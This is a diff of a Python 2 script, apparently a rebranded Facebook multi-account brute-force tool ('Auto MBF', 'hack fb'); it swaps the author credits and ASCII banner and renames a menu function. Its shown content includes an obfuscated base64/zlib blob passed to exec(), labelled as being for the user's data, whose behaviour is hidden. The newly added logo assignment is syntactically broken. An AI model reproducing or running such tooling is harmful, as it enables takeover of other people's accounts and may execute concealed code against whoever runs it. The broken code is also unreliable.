@@ -1,19 +1,19 @@
 # coding:utf8
 
 """
-* Jangan Recode Ya Goblok
-* Author : V4N654T
-* Github : https://github.com/V4N654T
+* unang salah pakke da
+* Author : HALAK-HITA2
+* Youtube : https://www.youtube.com/channel/UCI1LJn3uOrIu47k-KPkknNA
 -------------------------------------------------------
-* Name Tools : Auto MBF
-* Full Name : Auto Multi-Bruteforce-Facebook
-* buat : 21 jul 2019 (13.25 = WIB)
-* Support : -
-* Thanks : All Members (USER PEMULA TERMUX INDONESIA)
-                       (       D4RKN35 T34M         )
+* Goar : hack fb
+* Goarna sude : HALAK-HITA2 hack fb
+* dipature : na taon na salpu
+* Support : TEAM MONOLOCK
+* Mauliate tu : Team monoloc
+
 -------------------------------------------------------
-* JANGAN DINAKALIN YA GAN GUA PEMULA KOK
-  JADI INTINYA KITA SAMA SAMA BELAJAR :)
+* baru dope diparsiajari.unang adong na mambully da.
+sotung hu tallik :)
 """
 
 
@@ -55,13 +55,16 @@ def tik():
         sys.stdout.write('\r\033[31;1m[!] \x1b[1;92mTunggu Sebentar \x1b[1;97m' + animation[(i % len(animation))])
         sys.stdout.flush()
 
-logo = """
-\033[32;1m        __   _  _  ____   __     __  __  ___  ___
-       (  ) ( )( )(_  _) /  \   (  \/  )(  ,)(  _)
-       /__\  )()(   )(  ( () )   )    (  ) ,\ ) _)
-      (_)(_) \__/  (__)  \__/   (_/\/\_)(___/(_)\033[37;1m  [\033[33;1mv02\033[37;1m]
-\033[31;1m========================================================"""
-
+logo =
+ ________ ________  ______  __       __ __       __  ______  __    __  ______  __        ______   ______  __    __ 
+/        /        |/      \/  \     /  /  \     /  |/      \/  \  /  |/      \/  |      /      \ /      \/  |  /  |
+$$$$$$$$/$$$$$$$$//$$$$$$  $$  \   /$$ $$  \   /$$ /$$$$$$  $$  \ $$ /$$$$$$  $$ |     /$$$$$$  /$$$$$$  $$ | /$$/ 
+   $$ |  $$ |__   $$ |__$$ $$$  \ /$$$ $$$  \ /$$$ $$ |  $$ $$$  \$$ $$ |  $$ $$ |     $$ |  $$ $$ |  $$/$$ |/$$/  
+   $$ |  $$    |  $$    $$ $$$$  /$$$$ $$$$  /$$$$ $$ |  $$ $$$$  $$ $$ |  $$ $$ |     $$ |  $$ $$ |     $$  $$<   
+   $$ |  $$$$$/   $$$$$$$$ $$ $$ $$/$$ $$ $$ $$/$$ $$ |  $$ $$ $$ $$ $$ |  $$ $$ |     $$ |  $$ $$ |   __$$$$$  \  
+   $$ |  $$ |_____$$ |  $$ $$ |$$$/ $$ $$ |$$$/ $$ $$ \__$$ $$ |$$$$ $$ \__$$ $$ |_____$$ \__$$ $$ \__/  $$ |$$  \ 
+   $$ |  $$       $$ |  $$ $$ | $/  $$ $$ | $/  $$ $$    $$/$$ | $$$ $$    $$/$$       $$    $$/$$    $$/$$ | $$  |
+   $$/   $$$$$$$$/$$/   $$/$$/      $$/$$/      $$/ $$$$$$/ $$/   $$/ $$$$$$/ $$$$$$$$/ $$$$$$/  $$$$$$/ $$/   $$/ 
 #-> Ini Untuk Data Kamu
 exec(zlib.decompress(base64.b64decode("eJylkU9LAzEQxc8r+B1iL9mCTVergi09iZ7Eg+ipSsmms93Q/HOSta2f3uxut1oQRLwl897M5P2ygIIou1wCpv3x8VGSVB7QcA1kSqwDk9K6wMIm0FNCkfYZAl+k/drquPdri4u91a1/NgbcNrOTHFnrLENwfjwc5oqb1dXlxTnLsmwNeWl94M4xYfXwzipl14D+Lh/SZg5sBLhANIiSG/kB7Pnx/hbRYjvdoTSh92JestFodja5PtOzk1fyYImwxoAI0ppeY7Se+a0PoFOKmgywIF3Iye6+S9JsTVagKo5tlJhgXnARLG6Z9PMyaBXjP2EFO9WDiqvmhUWdGpxmXVddmFHQXCr6Gls6zgdyTbRRO7QHqql0Dtjomm+6fVWuZWgfV2H9mFhcQojntigLQj1/h8EC3qUASqQhUWyR7X8m0WCqtqHDjPBWgQ+etfdIz7ObPclv3Dvwv2H/K/cD8HUMUYJYORuXHab449yvqKA8/GPEJy5e+KY=")))
 
@@ -88,7 +91,7 @@ def menu():
     print "\033[31;1m========================================================"
     pilih_mbf()
 
-def pilih_mbf():
+def pilih_hh2():
     global okay
     peak = raw_input("\033[37;1mroot@R15K1\033[31;1m-\033[37;1m#\033[32;1m ")
     if peak == '':
